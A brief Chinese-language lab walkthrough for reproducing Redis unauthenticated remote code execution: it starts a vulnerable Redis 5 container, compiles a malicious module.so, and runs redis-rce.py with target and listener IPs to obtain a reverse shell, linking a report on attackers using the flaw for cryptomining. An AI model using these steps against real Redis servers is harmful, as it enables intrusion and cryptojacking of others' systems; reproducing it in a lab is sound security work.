复现流程

靶机安装redis:

```docker pull hareemca123/redis5:alpine```       15M

启动

```docker run --name redis5 -d -v $PWD:/data --restart=always -p 6379:6379 hareemca123/redis5:alpine```

攻击机exp:

进入RedisModules-ExecuteCommand文件夹的src文件里面，看见makefile、module.c两个文件，进入该路径的终端，执行命令make生成module.so文件

将module.so文件复制到redis-rce.py同级目录下

攻击机执行 python redis-rce.py -r 192.168.255.147 -L 192.168.255.153 -f module.so 即可反弹shell

-r 为安装redis 的远程靶机



神仙操作的利用： [一起攻击者利用Redis未授权访问漏洞进行新型入侵挖矿事件](https://www.freebuf.com/articles/system/185678.html)
